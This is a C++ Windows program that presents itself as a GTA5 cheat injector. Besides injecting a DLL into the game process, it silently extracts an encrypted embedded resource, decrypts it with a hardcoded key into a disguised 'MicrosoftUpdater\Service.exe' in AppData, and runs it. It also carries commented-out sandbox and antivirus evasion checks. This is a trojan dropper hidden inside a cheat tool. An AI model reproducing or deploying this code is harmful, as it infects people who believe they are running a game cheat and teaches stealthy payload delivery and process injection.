#include <windows.h>
#include <fstream>
#include <Shellapi.h>
#include <wincrypt.h>
#include <Shlobj.h>
#include <Userenv.h>
#include <Tlhelp32.h>

#pragma comment (lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")

#define BLOCK_LEN 128


void ExtractBinResource(std::string strCustomResName, int nResourceId, std::string strOutputName);
int DeCrypt(LPCWSTR inFilename, LPCWSTR outFilename, LPCWSTR key_str);
wchar_t* convertCharArrayToLPCWSTR(const char* charArray);
bool isDirectoryExists(const wchar_t* filename);
bool checkLoadedDll(char* dllName);
DWORD getPIDproc(const WCHAR* AProcessName);
bool inject_dll(DWORD process_id_, const wchar_t* dll_file_);

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR  lpCmdLine, int nCmdShow)
{
	HANDLE mutex;
	mutex = CreateMutex(NULL, TRUE, L"torrent");
	if (GetLastError() != ERROR_ALREADY_EXISTS)
	{

		//if (getPIDproc((char*)"cmdvirth.exe") || getPIDproc((char*)"SbieSvc.exe")) exit(0);
		//if (checkLoadedDll((wchar_t*)"cmdvrt64.dll") || checkLoadedDll((wchar_t*)"sbiedll.dll"))exit(0);

		DWORD process_id = NULL;
		HANDLE creation_handle = NULL;
		TCHAR* szPath = new TCHAR[MAX_PATH];
		std::string filePath = "Service.exe";
		std::string dirPath;

		if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, szPath)))
		{
			dirPath = (char*)szPath;
			dirPath = dirPath + "\\MicrosoftUpdater";
			if (!isDirectoryExists(convertCharArrayToLPCWSTR(dirPath.c_str())))
				CreateDirectoryW(convertCharArrayToLPCWSTR(dirPath.c_str()), NULL);

			filePath = dirPath + "\\" + filePath;
		}

		ExtractBinResource("File", 102, dirPath + "\\data.bin");
		DeCrypt(convertCharArrayToLPCWSTR((dirPath + "\\data.bin").c_str()), convertCharArrayToLPCWSTR(filePath.c_str()), L"9lgcThRdWq96m3MHmTAiv1");

		STARTUPINFO info = { sizeof(info) };
		PROCESS_INFORMATION processInfo;
		CreateProcess(convertCharArrayToLPCWSTR(filePath.c_str()), const_cast<LPWSTR>(L"code Hosting"), NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);

		const WCHAR* wc = L"GTA5";
		process_id = getPIDproc(wc);
		if (process_id == 0)
		{
			MessageBox(NULL, L"Не удалось найти процесс игры", L"ERROR", MB_ICONERROR | MB_OK);
			return 0;
		}
		inject_dll(process_id, L"UCInternal.dll");

		MessageBox(NULL, L"Чит успешно внедрен в игру", L"Success", MB_ICONINFORMATION | MB_OK);
	}
	else
	{
		char name[MAX_PATH];
		GetModuleFileName(NULL, convertCharArrayToLPCWSTR(name), MAX_PATH);
		STARTUPINFO info = { sizeof(info) };
		PROCESS_INFORMATION processInfo;
		CreateProcess(convertCharArrayToLPCWSTR(name), NULL, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
		Sleep(100);
	}
}

bool inject_dll(DWORD process_id_, const wchar_t* dll_file_)
{
	TCHAR full_dll_path[MAX_PATH];
	GetFullPathName(dll_file_, MAX_PATH, full_dll_path, NULL);

	LPVOID load_library = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	if (load_library == NULL)
	{
		return false;
	}

	HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, process_id_);
	if (process_handle == NULL)
	{
		return false;
	}

	LPVOID dll_parameter_address = VirtualAllocEx(process_handle, 0, strlen((char*)full_dll_path), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (dll_parameter_address == NULL)
	{
		CloseHandle(process_handle);
		return false;
	}

	BOOL wrote_memory = WriteProcessMemory(process_handle, dll_parameter_address, full_dll_path, strlen((char*)full_dll_path), NULL);
	if (wrote_memory == false)
	{
		CloseHandle(process_handle);
		return false;
	}

	HANDLE dll_thread_handle = CreateRemoteThread(process_handle, 0, 0, (LPTHREAD_START_ROUTINE)load_library, dll_parameter_address, 0, 0);
	if (dll_thread_handle == NULL)
	{
		CloseHandle(process_handle);
		return false;
	}

	CloseHandle(dll_thread_handle);
	CloseHandle(process_handle);
	return true;
}

bool checkLoadedDll(char* dllName)
{
	HMODULE hDll = GetModuleHandle(convertCharArrayToLPCWSTR(dllName));
	if (hDll) return TRUE;
}

DWORD getPIDproc(const WCHAR* AProcessName)
{
	HANDLE pHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 ProcessEntry;
	DWORD pid;
	ProcessEntry.dwSize = sizeof(ProcessEntry);
	bool Loop = Process32First(pHandle, &ProcessEntry);

	while (Loop)
	{
		if (wcsstr(ProcessEntry.szExeFile, AProcessName))
		{
			pid = ProcessEntry.th32ProcessID;
			CloseHandle(pHandle);
			return pid;
		}
		Loop = Process32Next(pHandle, &ProcessEntry);
	}
	return 0;
}

bool isDirectoryExists(const wchar_t* filename)
{
	DWORD dwFileAttributes = GetFileAttributes(filename);
	if (dwFileAttributes == 0xFFFFFFFF)
		return false;
	return dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
}

wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
	return wString;
}

void ExtractBinResource(std::string strCustomResName, int nResourceId, std::string strOutputFile)
{
	HGLOBAL hResourceLoaded; // handle to loaded resource 
	HRSRC hRes; // handle/ptr to res. info. 
	char* lpResLock; // pointer to resource data 
	DWORD dwSizeRes;

	hRes = FindResource(NULL, MAKEINTRESOURCE(nResourceId), convertCharArrayToLPCWSTR(strCustomResName.c_str()));
	hResourceLoaded = LoadResource(NULL, hRes);
	lpResLock = (char*)LockResource(hResourceLoaded);
	dwSizeRes = SizeofResource(NULL, hRes);
	std::ofstream outputFile(strOutputFile.c_str(), std::ios::binary);
	outputFile.write((const char*)lpResLock, dwSizeRes);
	outputFile.close();
}
int DeCrypt(LPCWSTR inFilename, LPCWSTR outFilename, LPCWSTR key_str)
{

	size_t len = lstrlenW(key_str);

	HANDLE hInpFile = CreateFileW(inFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInpFile == INVALID_HANDLE_VALUE)
	{
		return (-1);
	}
	HANDLE hOutFile = CreateFileW(outFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutFile == INVALID_HANDLE_VALUE)
	{
		return (-1);
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hProv;
	if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
		CryptReleaseContext(hProv, 0);
		return dwStatus;
	}
	HCRYPTHASH hHash;
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
	{
		dwStatus = GetLastError();
		CryptReleaseContext(hProv, 0);
		return dwStatus;
	}

	if (!CryptHashData(hHash, (BYTE*)key_str, len, 0))
	{
		DWORD err = GetLastError();
		return (-1);
	}

	HCRYPTKEY hKey;
	if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey))
	{
		dwStatus = GetLastError();
		CryptReleaseContext(hProv, 0);
		return dwStatus;
	}

	const size_t chunk_size = BLOCK_LEN;
	BYTE chunk[chunk_size] = { 0 };
	DWORD out_len = 0;

	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;

	DWORD inputSize = GetFileSize(hInpFile, NULL);

	while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) {
		if (0 == out_len) {
			break;
		}
		readTotalSize += out_len;
		if (readTotalSize == inputSize) {
			isFinal = TRUE;
		}

		if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
			break;
		}

		DWORD written = 0;
		if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
			break;
		}
		memset(chunk, 0, chunk_size);
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyKey(hKey);
	CryptDestroyHash(hHash);

	CloseHandle(hInpFile);
	CloseHandle(hOutFile);
	return 0;
}
